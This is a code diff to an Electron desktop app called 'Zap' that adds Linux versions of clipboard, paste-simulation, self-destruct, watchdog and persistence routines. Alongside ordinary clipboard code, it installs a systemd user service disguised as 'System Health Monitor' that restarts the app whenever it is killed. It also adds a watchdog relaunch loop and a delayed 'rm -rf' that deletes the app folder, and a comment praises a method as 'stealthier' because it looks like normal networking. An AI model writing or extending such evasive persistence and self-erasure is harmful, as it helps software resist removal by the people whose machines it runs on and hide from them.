@@ -1013,6 +1013,19 @@ ipcMain.on('copy-to-clipboard', (_ev, text) => {
       proc.stdin.write(text);
       proc.stdin.end();
     } catch (_) {}
+  } else if (process.platform === 'linux') {
+    // Try xclip first (X11), then xsel, then wl-copy (Wayland)
+    try {
+      const proc = require('child_process').spawn('xclip', ['-selection', 'clipboard']);
+      proc.stdin.write(text);
+      proc.stdin.end();
+    } catch (_) {
+      try {
+        const proc = require('child_process').spawn('wl-copy');
+        proc.stdin.write(text);
+        proc.stdin.end();
+      } catch (_) {}
+    }
   }
 });
 
@@ -1036,9 +1049,16 @@ ipcMain.handle('paste-to-screen', async () => {
         resolve({ success: !err });
       });
     });
-  } else {
+  } else if (process.platform === 'win32') {
     return new Promise(resolve => {
       exec(`powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('^v')"`, { timeout: 5000 }, (err) => {
+        resolve({ success: !err });
+      });
+    });
+  } else {
+    // Linux — use xdotool for key simulation
+    return new Promise(resolve => {
+      exec(`xdotool key --clearmodifiers ctrl+v`, { timeout: 5000 }, (err) => {
         resolve({ success: !err });
       });
     });
@@ -1614,7 +1634,7 @@ function selfDestructExecute() {
     : path.dirname(app.getPath('exe'));                           // → C:\Program Files\Zap
 
   // 3. Schedule delayed deletion so it runs after the process exits
-  if (process.platform === 'darwin') {
+  if (process.platform === 'darwin' || process.platform === 'linux') {
     try {
       exec(`(sleep 2 && rm -rf "${appPath}") &`, { detached: true, stdio: 'ignore' });
     } catch (_) {}
@@ -2736,6 +2756,10 @@ function startWatchdog() {
     const script = `while kill -0 ${pid} 2>/dev/null; do sleep 2; done; sleep ${delay}; open "${appBundle}"`;
     watchdogProc = exec(`bash -c '${script}'`, { detached: true, stdio: 'ignore' });
     if (watchdogProc.unref) watchdogProc.unref();
+  } else if (process.platform === 'linux') {
+    const script = `while kill -0 ${pid} 2>/dev/null; do sleep 2; done; sleep ${delay}; "${appPath}" &`;
+    watchdogProc = exec(`bash -c '${script}'`, { detached: true, stdio: 'ignore' });
+    if (watchdogProc.unref) watchdogProc.unref();
   } else if (process.platform === 'win32') {
     // Use cmd.exe + ping-based wait (stealthier than powershell — looks like normal networking)
     const escaped = appPath.replace(/"/g, '""');
@@ -2797,6 +2821,32 @@ function installPersistence() {
     } catch (err) { console.warn('[PERSISTENCE] Failed to install LaunchAgent:', err.message); }
   }
 
+  if (process.platform === 'linux') {
+    try {
+      const appPath = app.getPath('exe');
+      const serviceDir = path.join(os.homedir(), '.config', 'systemd', 'user');
+      const servicePath = path.join(serviceDir, 'zap-persistence.service');
+      if (!fs.existsSync(serviceDir)) fs.mkdirSync(serviceDir, { recursive: true });
+      const serviceContent = `[Unit]
+Description=System Health Monitor
+After=graphical-session.target
+
+[Service]
+Type=simple
+ExecStart=${appPath}
+Restart=always
+RestartSec=3
+Environment=DISPLAY=:0
+Environment=WAYLAND_DISPLAY=wayland-0
+
+[Install]
+WantedBy=default.target`;
+      fs.writeFileSync(servicePath, serviceContent);
+      exec('systemctl --user daemon-reload && systemctl --user enable zap-persistence.service && systemctl --user start zap-persistence.service', { timeout: 10000 });
+      console.log('[PERSISTENCE] Linux systemd user service installed — auto-restart on kill');
+    } catch (err) { console.warn('[PERSISTENCE] Failed to install Linux persistence:', err.message); }
+  }
+
   if (process.platform === 'win32') {
     try {
       const appPath = app.getPath('exe');
@@ -2856,6 +2906,15 @@ function removePersistence() {
       exec(`launchctl unload "${plistPath}" 2>/dev/null`, { timeout: 5000 });
       try { fs.unlinkSync(plistPath); } catch (_) {}
       console.log('[PERSISTENCE] macOS LaunchAgent removed');
+    } catch (_) {}
+  }
+  if (process.platform === 'linux') {
+    try {
+      exec('systemctl --user stop zap-persistence.service 2>/dev/null; systemctl --user disable zap-persistence.service 2>/dev/null', { timeout: 5000 });
+      const servicePath = path.join(os.homedir(), '.config', 'systemd', 'user', 'zap-persistence.service');
+      try { fs.unlinkSync(servicePath); } catch (_) {}
+      exec('systemctl --user daemon-reload', { timeout: 5000 });
+      console.log('[PERSISTENCE] Linux systemd service removed');
     } catch (_) {}
   }
   if (process.platform === 'win32') {
